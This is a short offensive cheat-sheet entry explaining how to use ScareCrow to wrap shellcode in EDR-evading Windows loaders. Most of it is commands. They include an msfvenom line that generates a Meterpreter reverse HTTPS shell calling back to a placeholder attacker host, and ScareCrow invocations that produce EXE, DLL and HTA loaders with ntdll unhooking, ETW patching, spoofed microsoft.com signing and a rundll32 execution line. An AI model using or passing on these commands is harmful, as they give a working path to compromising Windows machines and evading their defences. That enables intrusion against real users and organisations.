# 06.02 ScareCrow

> Generate evasive Windows EXE/DLL/JScript/HTA/Excel/CPL loaders — bypasses many EDRs out of the box.

## Overview

ScareCrow takes a raw shellcode blob and produces a Windows loader binary with built-in evasion: unhooks ntdll, custom syscalls, encrypted shellcode in resource, code signing via stolen certificates (sigthief-style). Output formats: EXE, DLL, JScript (.JS), HTA, Control Panel applet (CPL), Excel macro, MSI.

## Steps

- **Step 1** - Build ScareCrow.
- **Step 2** - Generate raw shellcode with msfvenom or Donut.
- **Step 3** - Run ScareCrow with your shellcode as input.

## Commands

### Install

```bash
git clone https://github.com/optiv/ScareCrow
cd ScareCrow && go build ScareCrow.go
```

### Generate shellcode first

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER> LPORT=443 -f raw -o sc.bin
```

### EXE loader

```bash
./ScareCrow -I sc.bin -Loader binary -Domain microsoft.com -outFile loader.exe
```

### DLL loader

```bash
./ScareCrow -I sc.bin -Loader dll -Domain microsoft.com -outFile loader.dll
# Execute: rundll32.exe loader.dll,DllRegisterServer
```

### HTA loader

```bash
./ScareCrow -I sc.bin -Loader hta -Domain microsoft.com -outFile loader.hta
```

### Custom evasion options

```bash
./ScareCrow -I sc.bin -Loader binary -Sleep 30 -ETW -unhook -outFile loader.exe
```
